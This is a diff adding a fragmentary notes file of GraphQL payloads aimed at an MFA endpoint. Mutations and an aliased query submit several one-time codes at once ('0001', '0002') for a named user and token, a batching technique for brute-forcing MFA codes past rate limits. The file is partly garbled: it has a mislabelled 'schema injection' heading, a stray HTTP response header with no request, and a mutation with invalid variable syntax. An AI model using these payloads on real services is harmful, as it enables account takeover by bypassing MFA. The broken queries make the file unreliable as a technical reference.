@@ -1,0 +1,28 @@
+orig:
+query submit_mfa_token($code: String!, $usertoken: String!, $username: String!) { submit_mfa_token(code: $code, usertoken: $usertoken, username: $username) }
+
+GraphQL schema injection:
+HTTP/1.1 200 OK
+Server: nginx/1.21.4
+Date: Sun, 05 Dec 2021 16:56:35 GMT
+Content-Type: application/json
+Connection: close
+X-Powered-By: PHP/8.1.0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Robots-Tag: noindex, nofollow, nosnippet, noarchive
+Content-Length: 17135
+
+mutation { submit_mfa_token($code: String!, $usertoken: String!, $username: String!) { submit_mfa_token(code: \"0001\", usertoken: \"60081ce3e492d0c3\", username: \"matthew@generallyql.com\") } }
+
+mutation {submit_mfa_token(code: \"0001\", usertoken: \"60081ce3e492d0c3\", username: \"matthew@generallyql.com\"){output}}
+mutation {submit_mfa_token(code: \"0002\", usertoken: \"60081ce3e492d0c3\", username: \"matthew@generallyql.com\"){output}}
+
+mutation createSession($input: CreateSessionInput!, $input1: CreateSessionInput!, $input2: CreateSessionInput!) {
+	first: createSession(input: $input) {
+		clientMutationId
+	}
+}
+
+query { submit_mfa_token(code: \"0001\", usertoken: \"60081ce3e492d0c3\", username: \"matthew@generallyql.com\") {code} submit_mfa_token(code: \"0002\", usertoken: \"60081ce3e492d0c3\", username: \"matthew@generallyql.com\") {code} }
